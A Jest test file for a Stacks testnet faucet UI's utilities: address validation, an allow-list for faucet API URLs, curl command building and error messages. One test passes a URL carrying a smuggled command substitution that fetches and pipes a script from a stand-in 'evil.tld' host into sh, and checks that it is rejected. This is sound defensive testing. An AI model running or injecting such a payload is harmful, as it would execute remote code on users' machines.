import {
  getDocumentableFaucetApiUrl,
  getFaucetCurlCommand,
  getFaucetErrorMessage,
  getRecipientAddressError,
} from '../utils';

const TESTNET_ADDRESS = 'ST221Z6TDTC5E0BYR2V624Q2ST6R0Q71T78WTAX6H';
const MAINNET_ADDRESS = 'SP2J6ZY48GV1EZ5V2V5RB9MP66SW86PYKKNRV9EJ7';

describe('getRecipientAddressError', () => {
  it('accepts a testnet address', () => {
    expect(getRecipientAddressError(TESTNET_ADDRESS)).toBeUndefined();
  });

  it('rejects an empty or malformed address', () => {
    expect(getRecipientAddressError('')).toBe('Enter a Stacks address.');
    expect(getRecipientAddressError('nonsense')).toBe('This is not a valid Stacks address.');
  });

  it('rejects a mainnet address, which no faucet can ever fund', () => {
    expect(getRecipientAddressError(MAINNET_ADDRESS)).toBe('This is not a testnet address.');
  });
});

describe('getDocumentableFaucetApiUrl', () => {
  it('allows the hosts we ship', () => {
    expect(getDocumentableFaucetApiUrl('https://api.testnet.hiro.so')).toBe(
      'https://api.testnet.hiro.so'
    );
    expect(getDocumentableFaucetApiUrl('http://localhost:3999')).toBe('http://localhost:3999');
  });

  it('refuses a custom api url so it can never reach a copy-paste shell command', () => {
    expect(
      getDocumentableFaucetApiUrl('https://evil.tld/x$(curl$IFS-sfevil.tld/p|sh)')
    ).toBeUndefined();
    expect(getDocumentableFaucetApiUrl('https://my-node.dev')).toBeUndefined();
    expect(getDocumentableFaucetApiUrl(undefined)).toBeUndefined();
  });
});

describe('getFaucetCurlCommand', () => {
  it('targets the given api for each token', () => {
    expect(getFaucetCurlCommand('https://api.testnet.hiro.so', 'stx')).toBe(
      'curl -X POST "https://api.testnet.hiro.so/extended/v1/faucets/stx?address=<STX_ADDRESS>"'
    );
    expect(getFaucetCurlCommand('https://api.testnet.hiro.so', 'sbtc')).toContain(
      '/extended/v1/faucets/sbtc?address='
    );
  });
});

describe('getFaucetErrorMessage', () => {
  it('maps the statuses the faucet actually returns', () => {
    expect(getFaucetErrorMessage({ status: 429 })).toBe(
      'Too many requests, please try again later.'
    );
    expect(getFaucetErrorMessage({ status: 403 })).toBe('This faucet is not available right now.');
    expect(getFaucetErrorMessage({ status: 500 })).toBe(
      'Something went wrong, please try again later.'
    );
  });

  it('describes a transport failure, which carries no status', () => {
    expect(getFaucetErrorMessage(new Error('Failed to fetch'))).toBe(
      'Could not reach the faucet. It may be rate limited, please try again later.'
    );
  });

  it('returns nothing when there is no error', () => {
    expect(getFaucetErrorMessage(undefined)).toBe('');
  });
});
